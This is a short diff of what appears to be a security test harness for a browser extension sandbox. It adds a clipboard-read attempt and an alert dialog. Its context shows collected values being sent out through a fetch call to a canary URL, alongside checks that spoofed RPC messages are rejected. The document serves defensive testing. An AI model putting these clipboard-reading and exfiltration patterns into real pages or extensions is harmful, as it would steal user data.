@@ -159,6 +159,11 @@ async function main() {
     return "opened";
   });
 
+  await attempt("clipboardRead", () => navigator.clipboard.readText());
+  fire("dialog", () => {
+    alert("hostile");
+  });
+
   // Sending data out, by every route a page has.
   const loot = encodeURIComponent(JSON.stringify(own.result?.values ?? {}));
   await attempt("exfilFetch", async () => (await fetch(`${canary}/fetch?d=${loot}`)).status);
@@ -260,7 +265,10 @@ async function main() {
   results.attacks.keyMethod = verdict(key, "unknown_method");
   const foreign = await call("config.get", { extension: "test/alpha" });
   results.attacks.otherExtensionConfig = verdict(foreign, "bad_request");
-  const extraKey = await raw({ v: 0, id: "extra", method: "theme.get", params: null, extension: "test/alpha" }, "extra");
+  const extraKey = await raw(
+    { v: 0, id: "extra", method: "theme.get", params: null, extension: "test/alpha" },
+    "extra",
+  );
   results.attacks.extraField = verdict(extraKey, "bad_request");
   const wrongVersion = await raw({ v: 1, id: "v1", method: "theme.get", params: null }, "v1");
   results.attacks.wrongVersion = verdict(wrongVersion, "bad_request");
